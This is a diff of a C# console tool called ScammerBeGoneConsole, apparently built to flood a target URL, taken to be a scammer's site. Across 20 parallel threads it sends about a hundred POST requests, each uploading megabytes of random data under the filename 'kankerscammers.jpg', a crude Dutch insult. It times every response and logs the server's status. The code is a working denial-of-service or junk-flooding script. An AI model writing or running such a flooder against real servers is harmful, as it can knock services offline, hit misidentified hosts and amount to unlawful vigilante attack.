@@ -35,30 +35,46 @@ namespace ScammerBeGoneConsole
             this.total = 0;
         }
 
-        public async Task Start(string data, string urlToPost)
+        public async Task Start(CustomStream data, string urlToPost)
         {
             Client = new RestClient(urlToPost);
             Client.Timeout = -1;
-            Parallel.For(1, 5*20, new ParallelOptions {MaxDegreeOfParallelism = 20 }, delegate (int i) { PerformRequest(data, i); });
+            Parallel.For(1, 100, new ParallelOptions { MaxDegreeOfParallelism = 20 }, delegate (int i) { PerformRequest(data, i); });
         }
 
-        private void PerformRequest(string data, int index)
+        private void PerformRequest(CustomStream data, int index)
         {
-            OnRequestCreated?.Invoke($"starting request {index} with datalength: {data.Length}");
+            using (MemoryStream s1 = data.GetStream())
+            {
+                OnRequestCreated?.Invoke($"starting request {index} with datalength: {data.Length}");
+                RestRequest request = new RestRequest(Method.POST);
+                request.AddHeader("Content-Type", "application/json");
+                request.Files.Add(new FileParameter
+                {
+                    Name = "bestandje",
+                    Writer = (s) => { s1.CopyTo(s); },
+                    FileName = "kankerscammers.jpg",
+                    ContentLength = data.Length
+                });
 
-            RestRequest request = new RestRequest(Method.POST);
-            request.AddHeader("Content-Type", "application/json");
-            request.AddParameter("application/json", $"{{\"data\":\"{data}\"}}", ParameterType.RequestBody);
-            IRestResponse response = Client.Execute(request);
-
-            if(response == null) OnRequestCompleted?.Invoke("Request " + index + " completed with no result");
-            else if(response.StatusCode == System.Net.HttpStatusCode.OK) OnRequestCompleted?.Invoke("Request " + index + " completed OK");
-            else if (response.StatusCode == System.Net.HttpStatusCode.InternalServerError) OnRequestCompleted?.Invoke("Request " + index + " completed with internal server error");
-            else OnRequestCompleted?.Invoke("Request " + index + " completed with other result: " + response.StatusCode);
+                DateTime begin = DateTime.Now;
+                IRestResponse response = Client.Execute(request);
+                DateTime end = DateTime.Now;
+                TimeSpan span = end - begin;
+                string time = $" with time {span.TotalMilliseconds}ms";
+                if (response == null) OnRequestCompleted?.Invoke("Request " + index + " completed with no result" + time);
+                else if (response.StatusCode == System.Net.HttpStatusCode.OK) OnRequestCompleted?.Invoke("Request " + index + " completed OK" + time);
+                else if (response.StatusCode == System.Net.HttpStatusCode.InternalServerError) OnRequestCompleted?.Invoke("Request " + index + " completed with internal server error" + time);
+                else OnRequestCompleted?.Invoke("Request " + index + " completed with other result: " + response.StatusCode + time);
+                response = null;
+                request = null;
+                data = null;
+                s1.Dispose();
+                GC.Collect();
+            }
         }
 
-
-        public async Task<MemoryStream> GenerateData()
+        public async Task<CustomStream> GenerateData()
         {
             const int blockSize = 1024 * 8;
             const int blocksPerMb = (1024 * 1024) / blockSize;
@@ -74,8 +90,9 @@ namespace ScammerBeGoneConsole
                     crypto.GetBytes(data);
                     await stream.WriteAsync(data, 0, data.Length);
                 }
-
-                return stream;
+                MemoryStream ms2 = new MemoryStream();
+                ms2.Write(stream.GetBuffer(), 0, (int)stream.Length);
+                return new CustomStream(ms2);
             }
         }
     }
